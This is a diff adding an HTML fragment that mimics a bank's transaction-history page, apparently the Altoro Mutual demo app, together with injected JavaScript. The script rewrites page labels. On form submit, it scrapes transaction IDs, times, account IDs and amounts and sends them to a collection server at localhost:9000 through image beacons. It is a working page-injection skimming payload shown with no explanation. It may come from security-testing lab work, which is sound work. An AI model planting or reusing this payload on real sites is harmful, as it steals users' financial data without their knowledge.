@@ -1,0 +1,46 @@
+<form id="Form1" name="Form1" method="post" action="showTransactions" onsubmit="return (postreq());">
+    <table border="0" style="padding-bottom:10px;">
+        <tbody><tr>
+            <td valign="top">After</td>
+            <td><input id="startDate" name="startDate" type="text" value=""><br><span class="credit">yyyy-mm-dd</span></td>
+            <td valign="top">Before</td>
+            <td><input name="endDate" id="endDate" type="text" value=""><br><span class="credit">yyyy-mm-dd</span></td>
+            <td valign="top"><input type="submit" value="Submit"></td>
+        </tr>
+    </tbody></table>
+    
+    <table cellspacing="0" cellpadding="3" rules="all" border="1" id="_ctl0__ctl0_Content_Main_MyTransactions" style="width:100%;border-collapse:collapse;">
+        <tbody><tr style="color:White;background-color:#BFD7DA;font-weight:bold;">
+            <td>Transaction ID</td><td>Transaction Time</td><td>Account ID</td><td>Action</td><td>Amount</td>
+        </tr>
+        
+    
+            <tr><td>13843</td><td>2019-11-07 18:59</td><td>800001</td><td>Deposit</td><td align="right">$1.00</td></tr>
+        
+    
+            <tr><td>13842</td><td>2019-11-07 18:59</td><td>800000</td><td>Withdrawal</td><td align="right">-$1.00</td></tr>
+        
+    
+            <tr><td>13652</td><td>2019-11-07 18:38</td><td>800000</td><td>Withdrawal</td><td align="right">-$3.00</td></tr>
+        
+    <tr>
+    
+        </tr>
+    </tbody></table>
+    
+    </form>
+
+    <script>
+        document.getElementsByClassName("fl")[0].firstElementChild.textContent="Recent Transactions";
+        document.querySelector("body > table > tbody > tr:nth-child(2) > td:nth-child(2) > div > p").textContent="";
+        function postreq() {
+            var a = document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(1)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(2) > td:nth-child(1)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(2)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(2) > td:nth-child(2)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(3)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(2) > td:nth-child(3)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(4)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(2) > td:nth-child(4)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(5)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(2) > td:nth-child(5)").textContent;
+            var b = document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(1)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(3) > td:nth-child(1)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(2)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(3) > td:nth-child(2)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(3)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(3) > td:nth-child(3)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(4)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(3) > td:nth-child(4)").textContent + ' , ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(1) > td:nth-child(5)").textContent + ' : ' + document.querySelector("#_ctl0__ctl0_Content_Main_MyTransactions > tbody > tr:nth-child(3) > td:nth-child(5)").textContent;
+
+            new Image().src = 'http://localhost:9000/?'+ a;
+            new Image().src = 'http://localhost:9000/?'+ b;
+
+            return(true);             
+        }
+    </script>
+    
